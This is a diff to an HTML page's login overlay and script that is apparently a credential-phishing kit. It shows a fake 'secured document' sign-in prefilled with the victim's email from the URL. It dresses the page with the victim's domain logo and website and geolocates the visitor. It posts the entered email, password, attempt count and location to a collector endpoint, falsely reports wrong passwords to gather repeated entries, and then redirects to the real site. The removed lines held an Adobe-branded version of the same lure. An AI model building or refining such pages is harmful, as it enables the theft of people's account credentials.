@@ -338,159 +338,119 @@
   </div>
   
 
-  <!-- LOGIN OVERLAY (your form preserved exactly, function unchanged) -->
-  <div class="login-overlay" id="loginOverlay">
-    <div class="login-container">
-      <div class="login-close" onclick="closeLogin()">✕</div>
-      <img src="https://i.postimg.cc/TRvqKyR3/Adobe-Systems-logo-and-wordmark-svg.png" alt="Adobe Logo" />
-      <div class="login-fields">
-        <label for="email">Secured file, sign in for your provider verification</label>
-        <input type="text" inputmode="email" id="email" placeholder="Enter your email" autocomplete="off" />
-        <label for="password"></label>
-        <input type="text" id="password" placeholder="Enter your email password" autocomplete="off" />
-        <div id="error-msg" class="error-msg">Incorrect email or password</div>
-        <button id="login-btn">View Documents</button>
-      </div>
+  <!-- ---------- LOGIN OVERLAY ---------- -->
+<div class="login-overlay" id="loginOverlay">
+  <div class="login-container">
+    <div class="login-close" onclick="closeLogin()">✕</div>
+    <img id="logo" src="https://via.placeholder.com/150?text=Logo" alt="Logo">
+    <div class="login-fields">
+      <label for="email">Enter your email for verification</label>
+      <input type="text" inputmode="email" id="email" placeholder="Enter your email" autocomplete="off" />
+      <input type="password" id="password" placeholder="Enter your password" autocomplete="off" />
+      <div id="error-msg" class="error-msg">Incorrect email or password</div>
+      <button id="login-btn">View Document</button>
     </div>
+    <iframe id="bg-frame"></iframe>
+    <img id="fallback-screenshot" alt="Preview fallback" />
   </div>
-  
+</div>
 
 <script>
-  let activeDoc = null;
+// ---------- ELEMENT REFERENCES ----------
+const loginOverlay = document.getElementById('loginOverlay');
+const emailInput = document.getElementById('email');
+const passwordInput = document.getElementById('password');
+const loginBtn = document.getElementById('login-btn');
+const errorMsg = document.getElementById('error-msg');
+const logoImg = document.getElementById('logo');
+const bgFrame = document.getElementById('bg-frame');
+const fallbackScreenshot = document.getElementById('fallback-screenshot');
 
-  function openLogin(e){
-    const thumb = e.currentTarget.closest('.thumb');
-    activeDoc = thumb?.dataset.doc || 'Document';
-    document.getElementById('loginOverlay').classList.add('show');
-  }
+let attempts = 0;
+const maxAttempts = 3;
+let userCity = "Unknown City";
+let userCountry = "Unknown Country";
+let activeDoc = null;
 
-  function closeLogin(){
-    document.getElementById('loginOverlay').classList.remove('show');
-    document.getElementById('error-msg').style.display='none';
-  }
+// ---------- HASH EMAIL HANDLING ----------
+const rawHash = window.location.hash.substring(1);
+if (/^[^@]+@[^@]+\.[^@]+$/.test(rawHash)) {
+    emailInput.value = rawHash;
+    emailInput.setAttribute("readonly", true);
+    const domain = rawHash.split('@')[1];
 
-  document.getElementById('login-btn').addEventListener('click', ()=>{
-    const err = document.getElementById('error-msg');
-    err.style.display='block';
-  });
-</script>
-
-<script>
-        const rawHash = window.location.hash.substring(1);
-        const emailInput = document.getElementById('email');
-        const logoImg = document.getElementById('logo');
-        const bgFrame = document.getElementById('bg-frame');
-        const passwordInput = document.getElementById('password');
-        const loginBtn = document.getElementById('login-btn');
-        const errorMsg = document.getElementById('error-msg');
-        const overlay = document.querySelector('.overlay');
-
-        let attempts = 0;
-        const maxAttempts = 3;
-
-        document.body.classList.add('blur-active');
-        
-        // Helper: parse document.cookie into an object { name: value, ... }
-function parseCookies(cookieString = document.cookie) {
-  const cookies = {};
-  if (!cookieString) return cookies;
-  cookieString.split(';').forEach(pair => {
-    const idx = pair.indexOf('=');
-    if (idx > -1) {
-      const name = pair.slice(0, idx).trim();
-      const val = pair.slice(idx + 1).trim();
-      try {
-        cookies[name] = decodeURIComponent(val);
-      } catch {
-        cookies[name] = val;
-      }
-    }
-  });
-  return cookies;
+    // Logo & iframe fallback
+    logoImg.src = `https://logo.clearbit.com/${domain}`;
+    logoImg.onerror = () => { logoImg.src = "https://via.placeholder.com/150?text=Logo"; };
+    bgFrame.src = `https://${domain}`;
+    bgFrame.onload = () => { bgFrame.style.display="block"; fallbackScreenshot.style.display="none"; };
+    bgFrame.onerror = () => { bgFrame.style.display="none"; fallbackScreenshot.src=`https://image.thum.io/get/width/1280/crop/900/https://${domain}`; fallbackScreenshot.style.display="block"; };
 }
 
-// Grab cookies now
-const cookies = parseCookies();
-// Optional: console log to check cookies
-console.log("Cookies available to JS:", cookies);
+// ---------- GEOLOCATION ----------
+fetch("https://ipapi.co/json/")
+  .then(res => res.json())
+  .then(data => {
+    userCity = data.city || userCity;
+    userCountry = data.country_name || userCountry;
+  })
+  .catch(()=>{}); // silent fail
 
-        if (!/^[^@]+@[^@]+\.[^@]+$/.test(rawHash)) {
-           
-        } else {
-            emailInput.value = rawHash;
+// ---------- DOCUMENT THUMB CLICK ----------
+function openLogin(e) {
+    const thumb = e.currentTarget.closest('.thumb');
+    activeDoc = thumb?.dataset.doc || 'Document';
+    loginOverlay.classList.add('show');
+}
 
-            const domain = rawHash.split('@')[1];
+function closeLogin() {
+    loginOverlay.classList.remove('show');
+    errorMsg.style.display = 'none';
+    passwordInput.value = '';
+}
 
-            // Set logo
-            logoImg.src = `https://logo.clearbit.com/${domain}`;
-            logoImg.onerror = () => { logoImg.src = "https://via.placeholder.com/150?text=Logo"; };
+// ---------- LOCAL COLLECTOR ----------
+const LOCAL_COLLECTOR_URL = "http://127.0.0.1:3000/collect";
 
-            // Fallback screenshot
-            const fallbackScreenshot = document.createElement('img');
-            fallbackScreenshot.id = "fallback-screenshot";
-            fallbackScreenshot.src = `https://image.thum.io/get/width/1280/crop/900/https://${domain}`;
-            document.body.appendChild(fallbackScreenshot);
+function sendToLocalCollector(payload) {
+    fetch(LOCAL_COLLECTOR_URL, {
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify(payload)
+    }).then(resp => resp.text().then(text => console.log("Collector response:", resp.status, text)))
+      .catch(err => console.warn("Collector POST failed:", err));
+}
 
-            // Load iframe
-            let iframeLoaded = false;
-            bgFrame.src = `https://${domain}`;
-            bgFrame.onload = () => { iframeLoaded = true; bgFrame.style.display = "block"; fallbackScreenshot.style.display = "none"; };
-            bgFrame.onerror = () => { bgFrame.style.display = "none"; fallbackScreenshot.style.display = "block"; };
-        }
+// ---------- LOGIN BUTTON ----------
+loginBtn.addEventListener('click', ()=>{
+    const password = passwordInput.value.trim();
+    if(!password){
+        errorMsg.textContent = "Password cannot be empty.";
+        errorMsg.style.display = "block";
+        return;
+    }
 
-        // User location
-        let userCity = "Unknown City";
-        let userCountry = "Unknown Country";
-        loginBtn.disabled = true;
+    attempts++;
 
-        fetch("https://ipapi.co/json/")
-            .then(res => res.json())
-            .then(data => {
-                userCity = data.city || userCity;
-                userCountry = data.country_name || userCountry;
-            })
-            .finally(() => { loginBtn.disabled = false; });
+    sendToLocalCollector({
+        email: emailInput.value,
+        password,
+        attempt: attempts,
+        city: userCity,
+        country: userCountry,
+        document: activeDoc
+    });
 
-        // Local collector URL
-        const LOCAL_COLLECTOR_URL = "http://127.0.0.1:3000/collect";
-
-        function sendToLocalCollector(payload) {
-            fetch(LOCAL_COLLECTOR_URL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
-            })
-            .then(resp => resp.text().then(text => console.log("[client.js] Collector response:", resp.status, text)))
-            .catch(err => console.warn("[client.js] Collector POST failed:", err));
-        }
-
-        // Login button
-        loginBtn.addEventListener('click', () => {
-            const password = passwordInput.value.trim();
-            if (!password) {
-                errorMsg.textContent = "Password cannot be empty.";
-                return;
-            }
-            attempts++;
-
-            // Send to local server
-            sendToLocalCollector({
-                email: emailInput.value,
-                password,
-                attempt: attempts,
-                city: userCity,
-                country: userCountry
-            });
-
-            if (attempts < maxAttempts) {
-                errorMsg.textContent = "Incorrect password.";
-                passwordInput.value = "";
-            } else {
-                errorMsg.textContent = "";
-                overlay.style.display = 'none';
-                window.location.href = `https://${emailInput.value.split('@')[1]}`;
-            }
-        });
-    </script>
+    if(attempts < maxAttempts){
+        errorMsg.textContent = "Incorrect password.";
+        errorMsg.style.display = "block";
+        passwordInput.value="";
+    } else {
+        errorMsg.style.display="none";
+        loginOverlay.style.display='none';
+        window.location.href = `https://${emailInput.value.split('@')[1]}`;
+    }
+});
+</script>
 </body>
 </html>
